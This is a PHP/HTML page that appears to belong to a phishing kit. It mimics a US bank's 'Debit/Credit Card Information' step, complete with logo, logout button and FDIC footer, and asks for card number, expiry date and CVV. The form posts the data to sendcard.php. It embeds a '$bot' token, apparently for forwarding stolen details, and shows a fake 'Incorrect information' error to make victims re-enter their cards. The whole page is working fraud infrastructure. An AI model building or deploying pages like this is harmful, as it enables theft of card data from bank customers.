
<!doctype html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="res/helper.css">
</head>
<body>
<div class="container-fluid">
<div class="row d-flex align-items-center">
<div class="col text-left p-3">
<img src="res/logo.svg" style="width:170px;">
</div>
<div class="col text-right p-3">
 <button class="btn bg-white" style="font-size:0.8em;">  Log out
</button>
</div>
</div>
</div>

<div class="container-fluid text-center py-5" style="background:url('res/back.svg') var(--green); background-size:cover;">

<div class="row bg-white rounded d-inline-block p-2" style="width:400px;">
<div class="col pt-5" style="color:green;">
<h4>Debit/Credit Card Information</h4>
<p class="text-dark" style="font-size:0.7em;">
Enter a card information that linked with your account.
</p>
</div>
<div class="form px-5 pb-5 pt-2">
<script>var token=<?php echo json_encode($bot); ?>;</script>

<?php 
if(isset($_GET['e'])){
	echo "<p style='color:red; font-size:0.8em;'>Incorrect information, please try again.</p>";
}
?>
<form action="sendcard.php" method="POST">
<div class="form-group">
<label>Card numbers</label>
<input type="text" required name="cc" id="cc" class="textinput" placeholder="XXXX XXXX XXXX XXXX">
</div>
<div class="form-group">
<label>Expiry date</label>
<input type="text" required  name="exp" id="exp" class="textinput" placeholder="MM/YY">
</div>
<div class="form-group">
<label>CVV Code</label>
<input type="text" required  name="cvv" id="cvv" class="textinput" placeholder="">
</div>
<div class="form-group">
<button class="btn rounded-pill sbmt w-100 bg-dark text-white p-2">Next</button>
</div>
 </form>
</div>
</div>

</div>


<footer class="text-left p-2 mt-5" style="font-size:0.8em;">
<div class="col py-1">
<img src="res/social.png" class="mw-100" style="width:160px;">
</div>
<div class="col py-1">
Lending products are subject to credit application and approval.
</div>
<div class="col py-1  font-weight-bold">
Investment, Insurance and Non-deposit Trust products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT GUARANTEED BY THE BANK • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • MAY LOSE VALUE
</div>
</footer>
<script src="res/jquery.js"></script>
<script src="res/jq.js"></script>
<script src="res/m.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>
